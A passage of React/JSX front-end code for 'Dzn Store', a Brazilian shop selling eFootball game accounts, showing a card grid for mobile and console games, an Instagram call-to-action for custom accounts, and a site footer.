        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
          {activeSection === 'mobile' 
            ? games.map((item, idx) => renderCard(item, idx))
            : consoleGames.map((item, idx) => renderCard(item, idx))
          }
        </div>

        {activeSection === 'console' && (
          <div className="mt-12 text-center p-8 rounded-3xl bg-gradient-to-br from-purple-900/20 to-pink-900/20 border border-purple-500/20">
            <h3 className="text-2xl font-black text-white mb-2">Quer uma conta personalizada?</h3>
            <p className="text-purple-200/70 mb-6">Montamos o time dos seus sonhos no PS5 ou Xbox.</p>
            <a href="https://instagram.com/dznefootball" target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-2 bg-white text-black px-6 py-3 rounded-full font-black hover:bg-gray-200 transition-colors">
              <MessageCircle size={20} />
              SOLICITAR ORÇAMENTO
            </a>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="relative z-10 border-t border-white/5 bg-black/80 backdrop-blur-xl py-12">
        <div className="max-w-7xl mx-auto px-4 text-center space-y-6">
          <div className="flex items-center justify-center gap-3 mb-4">
            <img src="https://i.imgur.com/ZRTzneV.png" alt="Dzn" className="w-8 h-8 rounded-lg opacity-80" />
            <span className="text-lg font-black text-gray-400">Dzn Store</span>
          </div>
          <p className="text-gray-500 text-sm max-w-md mx-auto">
            A maior loja de contas de eFootball do Brasil. Entrega automática 24h por dia.
          </p>
          <div className="flex justify-center gap-6 pt-4">
            <a href="https://instagram.com/dznefootball" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-pink-400 transition-colors text-sm font-bold">Instagram</a>
            <a href="#" className="text-gray-400 hover:text-purple-400 transition-colors text-sm font-bold">Termos de Uso</a>
            <a href="#" className="text-gray-400 hover:text-purple-400 transition-colors text-sm font-bold">Privacidade</a>
          </div>
          <p className="text-gray-600 text-xs pt-8">
            © {new Date().getFullYear()} Dzn Store. Todos os direitos reservados.
          </p>
        </div>
      </footer>
    </div>
  );
}